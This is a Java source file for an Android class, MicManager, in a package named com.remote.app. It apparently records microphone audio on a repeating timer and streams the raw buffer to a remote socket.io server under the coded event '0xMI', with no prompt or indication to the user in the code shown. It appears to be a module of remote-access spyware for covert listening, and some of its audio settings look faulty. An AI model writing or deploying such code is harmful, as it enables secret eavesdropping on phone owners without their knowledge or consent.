package com.remote.app;

import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.se.omapi.Channel;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.Timer;
import java.util.TimerTask;
import java.util.logging.Logger;

import io.socket.client.Socket;

public class MicManager {

    static Socket socket;
    static AudioRecord recorder;
    static byte[] buffer;
    static int bufferCapacity = 2 * 1000000; // 2MB
    static int AUDIO_FORMAT = AudioFormat.ENCODING_AAC_LC;

    static final Logger log = Logger.getLogger(MicManager.class.getName());

    static {
        socket = IOSocket.getSocket();
        recorder = new AudioRecord(MediaRecorder.AudioSource.VOICE_RECOGNITION, 44100, 1, AUDIO_FORMAT, bufferCapacity);
        buffer = new byte[bufferCapacity];
    }

    public static void startRecording() {
        try {
            recorder.startRecording();
        } catch (IllegalStateException e) {
            log.info(e.toString());
        }
    }

    public static void stopRecording() {
        try {
            sendData();
            recorder.stop();
        } catch (IllegalStateException e) {
            log.info(e.toString());
        }
    }

    public static void record(long seconds) {
        TimerTask task = new TimerTask() {
            @Override
            public void run() { sendData(); }
        };
        startRecording();
        new Timer().scheduleAtFixedRate(task, 0, seconds * 1000);
    }

    private static void sendData() {
        int readBytes = recorder.read(buffer, 0, bufferCapacity);
        if (readBytes == 0)
            log.info("no bytes available in audio recorder");
        try {
            JSONObject json = new JSONObject();
            json.put("file_name", "byte_data_file");
            json.put("data", buffer);
            socket.emit("0xMI", json);
        } catch (JSONException e) {
            log.warning(e.toString());
        }
    }
}



